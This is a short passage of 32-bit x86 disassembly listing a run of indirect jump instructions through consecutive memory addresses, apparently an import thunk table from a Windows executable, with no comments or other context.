  41c486:	jmp    DWORD PTR ds:0x41e334
  41c48c:	jmp    DWORD PTR ds:0x41e338
  41c492:	jmp    DWORD PTR ds:0x41e33c
  41c498:	jmp    DWORD PTR ds:0x41e340
  41c49e:	jmp    DWORD PTR ds:0x41e344
  41c4a4:	jmp    DWORD PTR ds:0x41e348
  41c4aa:	jmp    DWORD PTR ds:0x41e34c
  41c4b0:	jmp    DWORD PTR ds:0x41e350
  41c4b6:	jmp    DWORD PTR ds:0x41e354
  41c4bc:	jmp    DWORD PTR ds:0x41e358
  41c4c2:	jmp    DWORD PTR ds:0x41e35c
  41c4c8:	jmp    DWORD PTR ds:0x41e360
  41c4ce:	jmp    DWORD PTR ds:0x41e364
  41c4d4:	jmp    DWORD PTR ds:0x41e368
  41c4da:	jmp    DWORD PTR ds:0x41e36c
  41c4e0:	jmp    DWORD PTR ds:0x41e370
  41c4e6:	jmp    DWORD PTR ds:0x41e374
  41c4ec:	jmp    DWORD PTR ds:0x41e378
  41c4f2:	jmp    DWORD PTR ds:0x41e37c
  41c4f8:	jmp    DWORD PTR ds:0x41e380
  41c4fe:	jmp    DWORD PTR ds:0x41e384
  41c504:	jmp    DWORD PTR ds:0x41e388
  41c50a:	jmp    DWORD PTR ds:0x41e38c
  41c510:	jmp    DWORD PTR ds:0x41e390
  41c516:	jmp    DWORD PTR ds:0x41e394
  41c51c:	jmp    DWORD PTR ds:0x41e398
